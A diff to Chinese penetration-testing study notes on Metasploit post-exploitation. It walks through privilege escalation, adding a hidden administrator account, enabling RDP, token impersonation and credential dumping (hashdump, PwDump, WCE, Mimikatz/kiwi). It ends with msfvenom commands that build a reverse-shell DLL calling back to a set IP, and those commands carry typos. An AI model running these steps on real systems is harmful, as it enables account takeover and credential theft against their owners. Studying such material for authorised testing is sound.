@@ -3559,7 +3559,9 @@ whoami/groups
 
 
 
-#### 利用WMIC实战MS16-032本地溢出漏洞
+#### 利用WMIC本地溢出漏洞（提权）
+
+实战MS16-032
 
 假设此处我们通过一系列的渗透测试得到了目标机器的 Meterpreter Shell，首先输入 `getuid` 命令査看已经获得的权限，可以看到现在的权限很低，是test权限。尝试輸入 `geosystem` 命令提权
 
@@ -3627,9 +3629,23 @@ WMIC在信息收集和后渗透测试阶段非常实用，可以调取查看目�
 
 
 
+#### 创建windows用户
+
+使用meterpreter命令`shell`获取shell
+
+使用CMD指令创建用户并进行用户提权
+
+`net user 用户名 密码 /add`
+`net localgroup administrators 用户名 /add`
+`exit`退出CMD
+
+使用meterpreter命令`run getgui -e`开放3389端口
+
+开启远程桌面
 
 
-#### 令牌窃取
+
+#### 令牌窃取（提权）
 
 ##### 令牌窃取原理
 
@@ -3662,6 +3678,338 @@ Kerberos协议用于为客户提供认证服务
 
 ##### 假冒令牌的实战
 
+假设我们已经获得了目标机的Meterpreter Shell，输入 `getuid`  查看我们以获得的权限
+
+列出可用的令牌
+
+```
+use incognito		/加载这个模块
+list_tokens -u		/列出可用令牌
+```
+
+![image-20210319131843599](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319131843599.png)
+
+可以看到这里有两种类型的令牌
+
+- **Delegation Tokens：**授权令牌，支持交互式登录（例如可以通过远程桌面登录访问）
+- **Impersonation Tokens：**模拟令牌，它是非交互的会话。令牌的数量其实取决于Meterpreter Shell的访问级别
+
+
+
+这里我们就测试`WIN-J4K72UEU38S\86198` 这个令牌，其中**WIN-J4K72UEU38S**表示主机名，**86198**表示登录的用户名，下面利用**incognito**调用**impersonate_token**来假冒**86198**用户
+
+```
+impersonate_token WIN-J4K72UEU38S\\86198
+```
+
+**知识点：**在输入 **HOSTNAME\USERNAME** 时需要输入两个反斜杠 `\\`
+
+
+
+#### Hash攻击（提权）
+
+##### 使用Hashdump抓取密码
+
+Hashdump Meterpreter脚本可以**从目标机器中提取Hash值**，破解Hash值即可获得登录密码。计算机中的每个账号（如果是域服务器，则为域内的每个账号）的用户名和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，要想访问就必须有“系统级”账号。所以要使用该命令就必须进行权限的提升。
+
+在Meterpreter Shell提示符下输入 `hashdump` 命令，将导出目标机sam数据库中的Hash
+
+```
+hashdump
+```
+
+![image-20210319155526365](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319155526365.png)
+
+在非SYSTEM权限下远行 `hashdump` 命令会失败，而且在 Windows7、Windows Server2008下有时候会出现进程移植不成功等问题；而另一个模块 **`smart hashdumpe`** 的功能更为强大，可以导出域所有用户的Hash，其工作流程如下：
+
+- 检查Meterpreter会话的权限和目标机操作系统类型
+- 检查目标机是否为域控制服务器
+- 首先尝试从注册表中读取Hash，不行的话再尝试注入LSASS进程
+
+这里要注意如果目标机的系统是 Windows7，而目开启了UAC，获取Hash就会失败，这时需要先使用绕过UAC的后渗透攻击模块
+
+```
+run windows/gather/smart_hashdump
+```
+
+![image-20210319160110938](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319160110938.png)
+
+
+
+##### 使用Quarks PwDump抓取密码
+
+PwDump是一款Win32环境下的系统授权信息导出工具，目前没有任何一款工具可以导出如此全面的信息、支持这么多的OS版本，而且相当稳定。
+
+它目前可以导出：
+
+- Local accounts NT/LM hashes+history本机NT/LM哈希+历史登录记录
+- Domain accounts NT/LM hashes+history域中的NT/LM哈希+历史登录记录
+- Cached domain password缓存中的域管理密码
+- Bitlocker recovery information (recovery passwords & key packages)使用Bitlocker的恢复功能后遗留的信息(恢复密码&关键包)
+
+PwDump支持的操作系统为Windows XP/Windows 2003/Windows Vista/Windows 7/Windows 2008/Windows 8
+
+在Windows的密码系统中，密码以加密的方式保存在/windows/ system32/config/下的sam文件里，而账号在登录后会将密码的密文和明文保存在系统的内存中。正常情况下系统启动后，sam文件是不能被读取的，但是PwDump就能读取sam
+
+直接运行Quarks PwDump.exe，默认显示帮助信息，参数含义如下：
+
+| 参数  | 含义                                 |
+| ----- | ------------------------------------ |
+| -dhl  | 导出本地哈希值                       |
+| -dhdc | 导出内存中的域控哈希值               |
+| -dhd  | 导出域控哈希值，必须指定NTDS文件     |
+| -db   | 导出 Bitlocker信息，必须指定NTDS文件 |
+| -nt   | 导出NTDS文件                         |
+| -hist | 导出历史信息，可选项                 |
+| -t    | 可选导出类型，默认导出John类型       |
+| -o    | 导出文件到本地                       |
+
+![image-20210319162415279](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319162415279.png)
+
+输入命令导出密码
+
+```
+QuarksPwDump_v0.3b.exe -o xxx.txt
+```
+
+
+
+##### 使用Windows Credentials Editor抓取密码
+
+**Windows Credentials Editor（WCE）**是一款强大的Windows平台内网渗透工具，渗透工具，它能列举登录会话，并且可以添加、改变和删除相关凭据（例如LM/NT Hash)。这些功能在内网渗透中能够被利用，例如，在Windows平台上执行绕过Hash操作或者从内存中获取NT/LM Hash(也可以从交互式登录、服务、远程桌面连接中获取）以用于进一步的攻击，而且体积也非常小，是内网渗透时的必备工具。不过必须在管理员权限下使用，注意免杀。
+
+首先输入upload命令将wce.exe上传到目标主机C盘中，然后在目标机Shell下输入`wce -w`命令，便会成功提取系统明文管理员的密码
+
+```
+wce -w
+```
+
+![image-20210319163901047](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319163901047.png)
+
+
+
+默认使用**`-l`**命令读取数据（这种方法是在内存中读取已经登录的信息，而不是读取sam数据库中的信息）默认的读取方式是，**先用安全的方式读取，若读取失败再用不安全的方式**，所以很有可能对系统造成破坏。我们经常使用**`-f`**参数强制使用安全的方式读取，-g用来计算密码的
+
+| 参数 | 作用                                                         |
+| ---- | ------------------------------------------------------------ |
+| `-l` | 在内存中读取已经登录的信息，不是全部的账号信息，这是先用安全的方式读取，若读取失败再用不安全的方式，因此很有可能对系统造成破坏。（默认） |
+| `-f` | 强制使用安全的方式读取                                       |
+| `-g` | 计算密码，就是制定一个系统明文会使用的加密方法来计算密文     |
+| `-c` | 用于执行cmd                                                  |
+| `-v` | 用于查询看详细信息，比如uid                                  |
+| `-w` | 用于查看已登陆的明文密码                                     |
+
+![image-20210319183429605](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319183429605.png)
+
+![image-20210319183521983](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319183521983.png)
+
+
+
+##### 使用Mimikatz抓取密码（新工具kiwi）
+
+Mimikatz是一款后渗适测试工具，可以轻松抓取系统密码，此外还包括能够通过获取的Kerberos登录凭据，绕过支持RestrictedAdmin模式下Windows8或Windows Server2012的远程终端(RDP)等功能。需要注意该工具在Windows2000与Windows XP系统下无法使用！
+
+**Mimikatz必须在管理员权限下使用**，此时假设我们通过一系列前期渗透，已经成功获得目标机的Meterpreter Shell，当前权限为Administrator,输入 `getsystem` 命令获取了系统权限
+
+```
+getsystem
+```
+
+![image-20210319184139331](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319184139331.png)
+
+获取系统SYSTEM权限后，首先查看目标机器的架构。虽然Mimikatz同时支持32位和64位的Windows架构，但如果服务器是64位操作系统，直接使用Mimikatz后，Meterpreter会默认加载个32位版本的Mimikatz到内存，使得很多功能无效。而且在64位操作系统下必须先查看系统进程列表，然后在加载Mimikatz之前将进程迁移到个64位程序的进程中，才能查看系统密码明文，在32位操作系统下就没有这个限制。这里输入 `sysinfo` 命令
+
+```
+sysinfo
+```
+
+![image-20210319185405075](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319185405075.png)
+
+这里我们用kiwi这个模块，这个是新的
+
+```
+load kiwi
+help kiwi
+```
+
+![image-20210319185915850](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210319185915850.png)
+
+直接命令查看所有，其他参数可以根据提示执行
+
+```
+creds_all
+```
+
+| 命令                  | 功能                                         |
+| --------------------- | -------------------------------------------- |
+| creds_all             | 列举所有凭据                                 |
+| creds_kerberos        | 列举所有kerberos凭据                         |
+| creds_msv             | 列举所有msv凭据                              |
+| creds_ssp             | 列举所有ssp凭据                              |
+| creds_tspkg           | 列举所有tspkg凭据                            |
+| creds_wdigest         | 列举所有wdigest凭据                          |
+| dcsync                | 通过DCSync检索用户帐户信息                   |
+| dcsync_ntlm           | 通过DCSync检索用户帐户NTLM散列、SID和RID     |
+| kerberos_ticket_list  | 列举kerberos票据                             |
+| kerberos_ticket_purge | 清除kerberos票据                             |
+| kerberos_ticket_use   | 使用kerberos票据                             |
+| kiwi_cmd              | 执行mimikatz的命令，后面接mimikatz.exe的命令 |
+| lsa_dump_sam          | dump出lsa的SAM                               |
+| lsa_dump_secrets      | dump出lsa的密文                              |
+| password_change       | 修改密码                                     |
+| wifi_list             | 列出当前用户的wifi配置文件                   |
+| wifi_list_shared      | 列出共享wifi配置文件/编码                    |
+
+
+
+
+
+### 后渗透攻击：移植漏洞利用代码模块
+
+Metasploit的框架才是灵魂，它允许使用者开发自己的漏洞模块，从而进行测试，这些模块可以是用各种语言编写的，例如Perl、 Python等，Metasploit支持各种不同语言编写的模块移植到其框架中。通过这种机制可以将各种现存的模块软件移植到这个框架中。
+
+`metasploit-framework/modules/exploits`目录下就是模块的存放地方，我们也可以存入自己的模块，输入命令重新加载全部文件
+
+```
+reload_all
+```
+
+在移植到框架后需要先生成一个DLL文件，需要根据系统位数生成对应的DLL
+
+- 64位
+
+  ```
+  msfvenom -p windows/x64/meterpreter/reverse_tcp/Ihost=192.168.31.247 lport=4444 -f dll-o ~/eternal11.dll
+  ```
+
+- 32位
+
+  ```
+  msfvenom -p windows/meterpreter/reverse_tcp/Ihost=172.19.31.247 -f dll-o ~/eternal11.dll
+  ```
+
+
+
+### 后门
+
+#### 操作系统后门
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -3687,3 +4035,48 @@ Kerberos协议用于为客户提供认证服务
 
 
 ## Powershell击指南
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
